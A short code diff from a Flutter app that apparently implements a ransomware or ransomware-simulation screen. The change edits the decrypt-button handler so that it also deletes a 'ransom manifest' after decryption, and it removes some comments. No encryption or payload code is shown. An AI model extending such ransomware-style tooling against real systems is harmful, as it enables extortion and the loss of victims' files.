@@ -197,7 +197,6 @@ class _RansomScreenState extends State<RansomScreen> {
                         );
 
                         try {
-                          // ✅ Use runOperation (embedded logic) instead of runPayload
                           final result = await MalwareService.runOperation(
                             operation: 'decrypt',
                             rootPath: widget.targetFilePath,
@@ -208,7 +207,7 @@ class _RansomScreenState extends State<RansomScreen> {
                             throw Exception(result['error']);
                           }
 
-                          final decryptedCount = result['count'] as int? ?? 0;   // ✅ field name changed
+                          final decryptedCount = result['count'] as int? ?? 0;
                           if (decryptedCount == 0) {
                             ScaffoldMessenger.of(context).showSnackBar(
                               const SnackBar(content: Text('No encrypted files found to decrypt.')),
@@ -219,6 +218,9 @@ class _RansomScreenState extends State<RansomScreen> {
                             );
                             await MalwareService.clearEncryptionKey();
                           }
+
+                          // 👇 DELETE THE MANIFEST WHEN DECRYPT IS CLICKED
+                          await MalwareService.deleteRansomManifest();
 
                           if (mounted) {
                             Navigator.of(context, rootNavigator: true).pop();
